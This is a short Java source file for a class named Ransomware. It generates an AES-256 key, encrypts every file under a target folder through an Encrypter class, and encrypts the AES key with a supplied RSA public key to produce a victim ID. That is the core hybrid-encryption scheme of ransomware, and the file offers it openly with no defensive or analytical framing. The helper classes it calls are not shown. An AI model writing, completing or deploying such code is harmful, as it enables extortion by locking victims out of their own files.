package Ransomware;

import javax.crypto.SecretKey;
import java.io.File;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;

public class Ransomware {
    private final SecretKey key;
    private final File folder;
    private final Encrypter encrypter;
    private final String id;

    public Ransomware(String path,String ext,String publicKey) throws NoSuchAlgorithmException, InvalidKeySpecException {
        this.key = AES_256.generateKey();
        this.encrypter = new Encrypter(ext,AES_256.keyToString(key));
        this.id = RSA_Utils.Encrypt(RSA_Utils.loadPublicKey(publicKey),key);
        folder = new File(path);
    }
    public String execute() {
        try{
            encrypter.processFiles(folder);
            return id;
        }catch(Exception e){
            e.printStackTrace();
        }
        return "";
    }
}